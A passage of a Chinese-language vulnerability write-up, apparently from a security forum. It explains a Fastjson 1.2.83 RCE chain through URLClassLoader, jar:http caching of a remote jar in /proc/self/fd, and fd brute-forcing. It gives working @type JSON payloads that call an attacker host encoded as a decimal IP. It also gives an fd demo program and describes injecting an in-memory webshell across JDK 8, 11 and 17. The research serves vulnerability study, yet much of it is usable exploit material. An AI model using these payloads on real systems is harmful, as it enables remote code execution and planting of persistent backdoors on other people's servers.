        
    }
}
```

而通常 loadClass 方法的功能则就是加载字节码返回 class 原型, 更何况当前处于 URLClassLoader 是从远程服务器获取资源的, 这里能够向任意服务器发送远程 HTTP 请求已经很不安全...

但 Class.forName 不允许（这里聊到后续的 TomcatEmbeddedWebappClassLoader 会说明原因）:

```java
package com.vuln.fastjson;

import java.net.URL;
import java.net.URLClassLoader;

public class Test {
    public static void main(String[] args) throws Exception {
        ClassLoader classLoader = Test.class.getClassLoader(); 
        classLoader = new URLClassLoader(new URL[]{new URL("http://www.baidu.com/")},classLoader);
        Class.forName("http:..2130706433:2333.a", false, classLoader); 
      
    }
}
```

##### getResourceAsStream 发送远程请求原因

对于 getResourceAsStream 方法为什么能够发送除 URLClassLoader 已包含资源之外的 http 远程资源, 最根本的原因是 URL 的构造器存在解析问题:

```java
package com.vuln.fastjson;

import sun.net.www.ParseUtil;

import java.net.URL;

public class Test {
    public static void main(String[] args) throws Exception {
        URL url1 = new URL(new URL("http://www.baidu.com/"), ParseUtil.encodePath("jar:http://127.0.0.1:2333/a.jar!/123", false));
        URL url2 = new URL(new URL("http://www.baidu.com"), ("jar:http://127.0.0.1:2333/a.jar!/123"));
        System.out.println(url1); 
        System.out.println(url2); 
        
    }
}
```

当我们使用`getResourceAsStream("jar:http://127.0.0.1:2333/a.jar!/123")`方法时, 底层的代码走向则是上述 URL 案例. 也就是下方这个逻辑:

![image-20260724135138258.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-4ec13c64ef81417f89cbffa02c1f1d263ead200b.png)

##### loadClass 发送远程请求原因

当调用`URLClassLoader::loadClass`方法时, 当从父类找不到对应的类自然而然会调用 findClass:

![image-20260724133344274.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-49a87193b383420612424e4752cdd6139851617c.png)

但 `URLClassLoader::findClass` 完全重写了类加载逻辑:

![image-20260724133027071.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-cddd81d028732e2082826ba0c9f7359456138c15.png)

这里将类名中的`. 转换为 /`实际上也不难理解, 因为 URLClassLoader 若想要向远程 HTTP 服务器拉取字节码资源, 必然需要将`com.heihu577.test`转换为`com/heihu577/test.class`格式进行拉取, 但是这里问题就出在后续的`URLClassPath::getResource`在特定情况下是允许向任意服务器发送 HTTP 请求的.

URLClassLoader 通过重写了`findClass`完全自定义类加载逻辑, 通过`URLClassPath::getResource`发送远程 HTTP 请求:

![image-20260724134144570.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-cb29c184a8baa5493253c3dac34ebc6edbc41710.png)

得到类资源之后再进行 defineClass 即远程加载字节码. 这里`URLClassPath::getResource`方法为什么能够远程获取资源, 实际上是 URLClassLoader 中的 Loader 问题. 这一部分知识点我们马上就要了解到.

#### Loader & JarLoader & 选择 Loader 问题

普通的 URLClassLoader 使用的加载器是原生的 Loader, 但 AppClassLoader 中使用的是 JarLoader:

![image-20260723012452085.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-708c24dcec72e7ef7c466a1ae369de57ebc62c1e.png)

只有`Loader`才允许发送 HTTP 请求:

```java
private static class Loader implements Closeable {
    private final URL base;
    private JarFile jarfile;

    URL findResource(String var1, boolean var2) {
        URL var3;
        try {
            var3 = new URL(this.base, ParseUtil.encodePath(var1, false));
        } catch (MalformedURLException var7) {
            throw new IllegalArgumentException("name");
        }
                URLConnection var4 = var3.openConnection();
    ...
    }
}
```

而`JarLoader`仅仅是打开`Jar`文件去寻找文件:

```java
static class JarLoader extends Loader {
  URL findResource(String var1, boolean var2) {
      Resource var3 = this.getResource(var1, var2);
      return var3 != null ? var3.getURL() : null;
  }

  Resource getResource(String var1, boolean var2) {
      if (this.metaIndex != null && !this.metaIndex.mayContain(var1)) {
          return null;
      } else {
          try {
              this.ensureOpen();
          } catch (IOException var5) {
              throw new InternalError(var5);
          }

          JarEntry var3 = this.jar.getJarEntry(var1);
          if (var3 != null) {
              return this.checkResource(var1, var2, var3);
          } else if (this.index == null) {
              return null;
          } else {
              HashSet var4 = new HashSet();
              return this.getResource(var1, var2, var4);
          }
      }
  }
  ...
}
```

因此 JarLoader 没有机会发送 HTTP 请求. 而哪些协议对应哪些 Loader, 实际上在`sun.misc.URLClassPath::getLoader`方法中存在判断:

![image-20260723013843712.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-5e3bb8589076f3a370d90d6aa85b97b45846ceb4.png)

因此只要初始化的 URLClassLoader 中`非目录格式（避免 FileLoader）`以及非单纯一个文件指向了`jar 包（避免 JarLoader）`, 那么就能够利用`Loader`加载器加载远程资源! 而 SpringBoot 的 URLClassLoader 加载器刚好使用了`jar:file:`这种协议用于链接 FatJar 中的`META-INF/lib`目录, 因此`LaunchedURLClassLoader`能够正常选择到`Loader`而不是`JarLoader & FileLoader`, 因此 SpringBoot 的`LaunchedURLClassLoader`在`getResourceAsStream`或`loadClass`时能够远程发送请求.

## 无法 RCE 场景

### SpringBoot + TomcatEmbeddedWebappClassLoader 无法 RCE

#### Class.forName 问题

为什么这里又提到了`无法 RCE`呢？刚刚能够 RCE 的原因是刚刚的案例手动设置了`ContextClassLoader`, 如:

![image-20260723020611879.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-b3f260864636677ab29dd1d47d38c5e241153e62.png)

但 FastJson 在运行时会锁定到 TomcatEmbeddedWebappClassLoader:

![image-20260724011434032.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-4d8d1d51bcfa678c521facc5d2f245d7d5f18ab0.png)

对于为什么 ContextClassLoader 是 TomcatEmbeddedWebappClassLoader, 原因是在 SpringBoot 内嵌的 Tomcat 启动初始化时, 会设置 ContextClassLoader 为 TomcatEmbeddedWebappClassLoader（SpringBoot 之殇中恰好利用的 TomcatEmbeddedWebappClassLoader 才实现 RCE）.

但是在我们当前这个场景中这里不能进行直接 RCE, 原因是这里的 Class.forName 不允许连续的`..`出现在`Class.forName`中, 后续的流程:

![image-20260724125149720.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-2b328928665dc976ffe905a93b5718779b4af897.png)

直接抛出类无法找到异常, 但整个逻辑是先可以进行 SSRF 发起外链.

#### Class.forName 底层细节

对于 Class.forName 不允许出现`..`, 这里可以参考 kezibei 文章中的细节: [https://github.com/openjdk/jdk/blob/jdk8-b120/jdk/src/share/native/java/lang/Class.c](https://github.com/openjdk/jdk/blob/jdk8-b120/jdk/src/share/native/java/lang/Class.c) & [https://github.com/openjdk/jdk/blob/30471d74345d406ce78e2ecbe5cda0d8bfdba3bf/src/java.base/share/native/libjava/check\_classname.c#L131](https://github.com/openjdk/jdk/blob/30471d74345d406ce78e2ecbe5cda0d8bfdba3bf/src/java.base/share/native/libjava/check_classname.c#L131)

补充细节先是将 . 转换为 /:

![image-20260724141106687.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-6732dec7e01b5ad32dfa6683bafdbc7156746073.png)

由于使用了指针, 因此 char 类型的 name 在接下来会判断是否存在 //, 若存在则直接抛出异常:

![image-20260724010713323.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-ecf397a00a6b95450360af4b542d01ef548a6062.png)

因此在 TomcatEmbeddedWebappClassLoader 中, 由于不再使用`loadClass`而采用了`Class.forName`的因素导致无法进行 RCE.

### JDK9+ 无法 RCE

当版本切换为 JDK11 之后, 就算将 ContextClassLoader 配置为`LaunchedURLClassLoader`发现无法 RCE:

![image-20260724145415899.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-3f89d9bf7cb88f6d528316fe1d08eed22f74b150.png)

发现在 defineClass 处抛出异常:

![image-20260724150354453.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-800337fe16025efbdbab11ac09a6e67bb04098fa.png)

#### ClassLoader::defineClass 底层细节

原因是 JDK 高版本中 defineClass 不允许连续的`.`, 同样在 native 层: [https://github.com/openjdk/jdk11u/blob/master/src/java.base/share/native/libjava/ClassLoader.c](https://github.com/openjdk/jdk11u/blob/master/src/java.base/share/native/libjava/ClassLoader.c) & [https://github.com/openjdk/jdk8u/blob/master/jdk/src/share/native/java/lang/ClassLoader.c](https://github.com/openjdk/jdk8u/blob/master/jdk/src/share/native/java/lang/ClassLoader.c)

![微信图片_20260725202110_81_233.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-911bf0dc3864fa834fe9dfdb4d46db5c7d9bf86b.png)

最主要的是不允许出现连续的 //:

![image-20260724154022332.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-4dfc4dc34cd38b4b73f82f08fccb2ac0d020cc8b.png)

## 利用 jar:file & jar:http 进行突破

### jar 文件上传回顾

此时将环境转为 Linux 环境, 这里准备了一个 Kali Linux GUI 进行分析绕过手法. 绕过手法很简单, 在之前 XXE 时我们了解过 jar 文件上传:

![image-20260724175601211.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-d2c827b2c387f7d8b7f90fc14aee0e207e366c4b.png)

由于 jar 协议会往目标机器上上传临时文件, 只不过临时文件会被立马删除. 但在 Linux 系统中, 真的是这样吗？

#### fd 小实验 - Linux

我们可以做一个实验, 在 Linux 系统中演示 jvm:

```java
package com.vuln.fastjson;

import java.io.*;
import java.nio.MappedByteBuffer;
import java.nio.file.*;
import java.nio.channels.*;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;


public class FdTest {

    public static void main(String[] args) throws Exception {
        System.out.println("=== Linux fd demo: file deleted but fd still works ===\n");
        System.out.println("JVM PID: " + ManagementFactory.getRuntimeMXBean().getName().split("@")[0]);
        System.out.println();

        demo1_basicFdSurvival();
        System.out.println();

        demo2_recoverViaProcFd();
        System.out.println();

        demo3_mmapKeepsInodeAlive();
        System.out.println();

        demo4_fastjsonLikeScenario();
    }

    
    static void demo1_basicFdSurvival() throws Exception {
        System.out.println("--- Scenario 1: basic demo ---");

        
        Path tmp = Files.createTempFile("fd-demo-", ".txt");
        String original = "Hello from FdTest!\nThis data survives file deletion.\n";
        Files.write(tmp, original.getBytes());
        System.out.println("[1] Created file: " + tmp);
        System.out.println("    Content: " + original.replace("\n", "\\n"));

        
        FileInputStream fis = new FileInputStream(tmp.toFile());
        int fdNum = getFdNumber(fis.getFD());
        System.out.println("[2] Opened file, fd=" + fdNum);

        
        showProcFdLink(fdNum);

        
        Files.delete(tmp);
        System.out.println("[3] Deleted file: " + tmp);

        
        System.out.println("[4] File exists? " + Files.exists(tmp));

        
        showProcFdLink(fdNum);

        
        byte[] data = readAllBytes(fis);
        System.out.println("[5] Read via FileInputStream: " + new String(data).replace("\n", "\\n"));

        
        byte[] viaProc = Files.readAllBytes(Paths.get("/proc/self/fd/" + fdNum));
        System.out.println("[6] Read via /proc/self/fd/" + fdNum + ": " + new String(viaProc).replace("\n", "\\n"));

        fis.close();
        System.out.println("[7] Closed fd");

        
        showProcFdLink(fdNum);
    }

    
    static void demo2_recoverViaProcFd() throws Exception {
        System.out.println("--- Scenario 2: recover a deleted file ---");

        Path tmp = Files.createTempFile("fd-recover-", ".bin");
        byte[] payload = "SECRET-DATA-12345".getBytes();
        Files.write(tmp, payload);
        System.out.println("[1] Created file: " + tmp + " (" + payload.length + " bytes)");

        FileInputStream fis = new FileInputStream(tmp.toFile());
        int fdNum = getFdNumber(fis.getFD());
        System.out.println("[2] Opened, fd=" + fdNum);

        Files.delete(tmp);
        System.out.println("[3] Deleted original file");
        System.out.println("    File exists? " + Files.exists(tmp));

        
        Path recovered = Paths.get("/tmp/fdTest-recovered.bin");
        Files.copy(Paths.get("/proc/self/fd/" + fdNum), recovered, StandardCopyOption.REPLACE_EXISTING);
        System.out.println("[4] Copied /proc/self/fd/" + fdNum + " -> " + recovered);

        byte[] recoveredData = Files.readAllBytes(recovered);
        System.out.println("[5] Recovered content: " + new String(recoveredData));
        System.out.println("[6] Content matches? " + new String(payload).equals(new String(recoveredData)));

        fis.close();
        Files.deleteIfExists(recovered);
    }

    
    static void demo3_mmapKeepsInodeAlive() throws Exception {
        System.out.println("--- Scenario 3: mmap keeps inode alive ---");

        Path tmp = Files.createTempFile("fd-mmap-", ".dat");
        byte[] data = new byte[4096];
        for (int i = 0; i < data.length; i++) data[i] = (byte) (i % 256);
        Files.write(tmp, data);
        System.out.println("[1] Created file: " + tmp + " (" + data.length + " bytes)");

        
        try (FileChannel ch = FileChannel.open(tmp, StandardOpenOption.READ)) {
            MappedByteBuffer buf = ch.map(FileChannel.MapMode.READ_ONLY, 0, data.length);
            System.out.println("[2] mmap done, buffer capacity=" + buf.capacity());

            int fdNum = getFdNumber(ch);
            System.out.println("[3] FileChannel fd=" + fdNum);
            showProcFdLink(fdNum);

            
            Files.delete(tmp);
            System.out.println("[4] Deleted file");
            System.out.println("    File exists? " + Files.exists(tmp));
            showProcFdLink(fdNum);

            
            byte firstByte = buf.get(0);
            byte lastByte = buf.get(data.length - 1);
            System.out.println("[5] mmap read: buf[0]=" + (firstByte & 0xFF) + ", buf[end]=" + (lastByte & 0xFF));

            
        }
        System.out.println("[6] FileChannel closed");
        System.out.println("    Note: mmap mapping may still hold the inode until GC");
    }

    
    static void demo4_fastjsonLikeScenario() throws Exception {
        System.out.println("--- Scenario 4: simulate fastjson fd exploit mechanism ---");
        System.out.println("    (open jar -> delete -> read via /proc/self/fd/N)");

        
        Path jarPath = Paths.get("/tmp/fdTest-probe.jar");
        createSimpleJar(jarPath);

        
        RandomAccessFile raf = new RandomAccessFile(jarPath.toFile(), "r");
        int fdNum = getFdNumber(raf.getFD());
        System.out.println("[1] Opened jar: " + jarPath + ", fd=" + fdNum);
        showProcFdLink(fdNum);

        
        Files.delete(jarPath);
        System.out.println("[2] Deleted jar");
        System.out.println("    Jar exists? " + Files.exists(jarPath));
        showProcFdLink(fdNum);

        
        long size = raf.length();
        System.out.println("[3] Read jar size via fd: " + size + " bytes");

        
        String simulatedPayload = "jar:file:/proc/self/fd/" + fdNum + "!/META-INF/MANIFEST.MF";
        System.out.println("[4] Simulated fastjson payload: " + simulatedPayload);

        
        Path viaFd = Paths.get("/proc/self/fd/" + fdNum);
        System.out.println("[5] /proc/self/fd/" + fdNum + " accessible? " + Files.exists(viaFd));
        System.out.println("    Size: " + Files.size(viaFd) + " bytes");

        raf.close();
        System.out.println("[6] Closed fd, jar inode truly released");
    }

    

    
    static int getFdNumber(FileDescriptor fd) throws Exception {
        Field f = FileDescriptor.class.getDeclaredField("fd");
        f.setAccessible(true);
        return (int) f.get(fd);
    }

    
    static int getFdNumber(FileChannel ch) throws Exception {
        Field f = ch.getClass().getDeclaredField("fd");
        f.setAccessible(true);
        Object fdVal = f.get(ch);
        return getFdNumber((FileDescriptor) fdVal);
    }

    
    static void showProcFdLink(int fdNum) throws IOException {
        Path link = Paths.get("/proc/self/fd/" + fdNum);
        if (Files.exists(link)) {
            Path target = Files.readSymbolicLink(link);
            System.out.println("    /proc/self/fd/" + fdNum + " -> " + target);
        } else {
            System.out.println("    /proc/self/fd/" + fdNum + " (does not exist, fd closed)");
        }
    }

    
    static byte[] readAllBytes(InputStream is) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = is.read(buf)) != -1) {
            bos.write(buf, 0, n);
        }
        return bos.toByteArray();
    }

    
    static void createSimpleJar(Path jarPath) throws IOException {
        try (java.util.jar.JarOutputStream jos = new java.util.jar.JarOutputStream(
                new FileOutputStream(jarPath.toFile()))) {
            
            jos.putNextEntry(new java.util.jar.JarEntry("META-INF/MANIFEST.MF"));
            jos.write("Manifest-Version: 1.0\nCreated-By: FdTest\n".getBytes());
            jos.closeEntry();

            
            jos.putNextEntry(new java.util.jar.JarEntry("fd3/Exception.class"));
            jos.write("fake class bytes".getBytes());
            jos.closeEntry();
        }
        System.out.println("    (created test jar: " + jarPath + ")");
    }
}
```

这个案例中, 只要还有任何 fd 的方式指向了该文件, 那么该文件则会驻留到 /proc/self/fd/{ID} 中. 因此 jar:http: 从远程服务器获取到的 jar 文件存在被驻留到 /proc/self/fd 的可能!

#### fastjson 中复现

接下来我们看看当前场景如何将临时文件保留下来, 首先我准备了一个 Hello.zip 文件（但实际运用中需要将.zip 后缀去掉原因是 payload 中不能包含.会被转换为/）, 其中包含 Hello.class, 在发送请求之前先对攻击机机的 ip 地址进行十进制转换:

```php
172.29.112.1 计算为十进制：
  172 × 256³ + 29 × 256² + 112 × 256¹ + 1 × 256⁰
  = 172 × 16777216 + 29 × 65536 + 112 × 256 + 1
  = 2885681152 + 1900544 + 28672 + 1
  = 2887610369
  结果：2887610369 
```

随后在攻击机中使用 python 进行监听一个 http.server, 发送 payload:

![image-20260724190417670.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-6428fb0f61f852d5e1c5350c368b69fbeea65a58.png)

可以看到的是成功获取到了 HTTP 请求, 随后在受害机器中查看是否生产出来了 /proc/self/fd/{id}:

![image-20260724190809733.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-84bbef0d3fc05a5913dc1118bcc6249efad33cdc.png)

可以看到的是, 这里成功将我们攻击机想要传递的文件成功驻留到`/proc/JVM_PROCESS_ID/fd/随机数`中了. 那么驻留该文件有什么用呢？

答案是`jar:file:/proc/JVM_PROCESS_ID/fd/随机数!/类名`语法中, 不会出现`连续的/`! 可以解锁:

-   `SpringBoot + TomcatEmbeddedWebappClassLoader 场景下 避免 Class.forName 方法阻拦连续的 /`
-   `JDK9+ 下的 ClassLoader::defineClass 场景下 避免 native 层方法阻拦连续的 /`

### 字节码问题 & 包名问题

通过上述流程我们明确了无视 JDK 版本的攻击分为:

1.  使用:

```php
{"@type":"jar:http:..2887610369(攻击机 IP 的 10 进制):2333(攻击机端口).Hello!.Hello","val":1}
```

将恶意 jar 包驻留到受害机中的 /proc/JVM\_PROCESS\_ID/fd 中

2.  使用:

```php
{"@type":"jar:file:.proc.self.fd.{爆破的数值1-100}!.类名","val":1}
```

来尝试暴力破解出 fd 的缓存值, 并且加载攻击者放置的恶意类名达到字节码注入到 JVM 内存的目的.

* * *

不过现在存在一个问题, 在之前测试时, defineClass 的值为:

![image-20260724211154242.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-15f69f5c695c6dbdac1215f993e2279912461333.png)

因此这里定义类名必须为`jar:file:.proc.self.fd.{爆破的数值1-100}!.类名`, 否则 defineClass 会抛出与类名不匹配的错误.

比如按照上述案例继续测试:

![image-20260724214730289.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-853d0c51c08094612236added79d329d87c1d5f9.png)

根据这个案例, 我们可以发现的是这里类必须存在特定的包名, 以 `Hello` 类为例，其加载路径必须形如 `jar:file:/proc/self/fd/29!/`，其中 `29` 即为爆破目标 —— 在类数据写入受害机前，我们必须预测它将占据 `/proc/self/fd/` 下的哪个编号。口述比较麻烦, 用 AI 画张图:

![image-20260724222646226.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-0fbba4511c626cb377819e7dfa729ec74fade832.png)

这张图中, 只有场景 A 能够达到 RCE 的效果, 场景 B 和场景 C 均会失效!

#### RCE 概率问题

如何在这个基础之上, 增加 RCE 的概率？我发现两个 Payload 只能分开发送, 当然分开发送可以参考 [https://mp.weixin.qq.com/s/2NLGg2\_8CqWvAn2qrIoTFw](https://mp.weixin.qq.com/s/2NLGg2_8CqWvAn2qrIoTFw) 中爆破可能会增加 fd 的数量, 因此不如将请求定义为一次发送:

```php
{"@type":"jar:http:..2887610369:2333.Hello!.Hello","@type":"jar:file:.proc.self.fd.70!.Hello"}
```

不过当我定义完一次发送之后, 发现后面的`jar:file:.proc.self.fd.70!.Hello`根本无法访问, 答案是 FastJson 提前抛出异常退出了:

![dae941b4ac26e076c74e0dc2f849f704.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-c1cff0dc271e877ee04a90626cc482d1941b893d.png)

不过若类名末尾为 Exception, 这里会返回 null 不会抛出异常, 因此有如下 payload 能将其定义为一行:

{"@type":"jar:http:..2887610369:2333.HelloException!.HelloException","@type":"jar:file:.proc.self.fd.70!.HelloException"}

其中服务端响应也 OK:

![image-20260724230325299.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-246e7bb4a3eed9887a86ee3f926a1df251025b95.png)

但实战发现当 jar 包内容数量过多时, 会造成死锁问题. 故不考虑这种方式（可能存在一些突破？）.

#### RCE 思路 & 最终实现

1.  创建一个 jar 包, 其中包含`fd0.Exception, fd1.Exception, fd2.Exception...`, 并且通过

```php
{"@type":"jar:http:..2887610369(攻击者IP的10进制):2333(攻击者监听的端口).生成的jar包名称!.1"
```

对受害机的 /proc/self/fd 进行缓存.

2.  由于不知道缓存的 fd 的数值是多少, 因此需要使用:

```php
{"@type":"jar:file:.proc.self.fd.数值爆破!.fd数值爆破.类名"}
```

其中`数值爆破`部分, 可以通过:

![image-20260725012007178.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-352123cfb786461319dd25fb91d5787e4a197957.png)

进行爆破，这里的类名需要遵循 @type 的类名规范，使用 ASM 调教 AI 很容易编写出来相应的脚本。

最终效果:

![xw_20260725202901.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-426814a475619117ba5be3f0e64bea782c398357.png)

##### 注入内存马版本（JDK8, JDK11, JDK17...）

在 JDK 8 / JDK 17 的内存马注入中，我们知道 JDK17 中通常需要使用 MethodHandlers.lookup().defineClass 进行注入内存马，但当前 fastjson 环境最终是进入`Class.forName || ClassLoader::defineClass`。直接性的代码执行，为了版本的兼容性我们可以直接将注入的类继承自 ClassLoader，在 static 代码块中直接执行即可。

ASM 最终生成的 Class 文件:

![image-20260725022705950.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-73aa9078456575f5f7448560d10c5e150734aa65.png)

这里可以直接通吃 JDK8 / 17，只不过需要注意的是生成内存马时一定要选择内存马版本:

![image-20260725192143463.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/07/attach-c91b26c4322cdd5a7987fc3dfa8c8f46b5fcf9fc.png)

否则可能会遇到内存马注入失败的场景.

## Reference

官方原文: [https://fearsoff.org/research/fastjson-1-2-83-rce](https://fearsoff.org/research/fastjson-1-2-83-rce)

fastjson GitHub 更新提示: [https://fearsoff.org/cn/research/fastjson-1-2-83-rce](https://fearsoff.org/cn/research/fastjson-1-2-83-rce)

1.2.83 详情: [https://mp.weixin.qq.com/s/\_4Tnren1hIBToZvHlaKq8w](https://mp.weixin.qq.com/s/_4Tnren1hIBToZvHlaKq8w)

真实环境打 fastjson 1.2.83 rce？答案是有点难: [https://mp.weixin.qq.com/s/2LKuHMAv1HQkIc\_vyr1kxA](https://mp.weixin.qq.com/s/2LKuHMAv1HQkIc_vyr1kxA)

Fastjson 二次发包实战其实也难以利用: [https://mp.weixin.qq.com/s/2NLGg2\_8CqWvAn2qrIoTFw](https://mp.weixin.qq.com/s/2NLGg2_8CqWvAn2qrIoTFw)

SpringBoot + undertow | jetty: [https://mp.weixin.qq.com/s/ngrBwRPtFzM4G3A\_P9SCog](https://mp.weixin.qq.com/s/ngrBwRPtFzM4G3A_P9SCog)
